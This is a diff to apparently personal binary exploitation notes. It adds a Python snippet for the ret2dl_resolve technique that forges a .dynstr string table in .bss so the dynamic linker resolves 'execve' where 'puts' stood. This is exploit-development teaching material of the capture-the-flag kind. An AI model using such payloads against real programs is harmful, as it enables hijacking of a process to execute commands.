@@ -1132,6 +1132,17 @@ if we cange d_val to a section in the .bss we can basically write our own String
 ```
 <img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/nRELROdynamicSection.png">		
 <img src="https://github.com/Bex32/Pwn-Notes/blob/main/src/ret2dl_resolve/dynstr.png">
+		
+fake .dynstr in .bss (d_val points to the first `\x00`)		
+```
+payload = b'\x00'
+payload += b'libc.so.6\x00'		
+payload += b'gets\x00'
+payload += b'execve\x00'		#puts was here before
+payload += b'__libc_start_main\x00'
+payload += b'GLIBC_2.2.5\x00'
+payload += b'__gmon_start__\x00'
+```
 
 </div>
 </details>
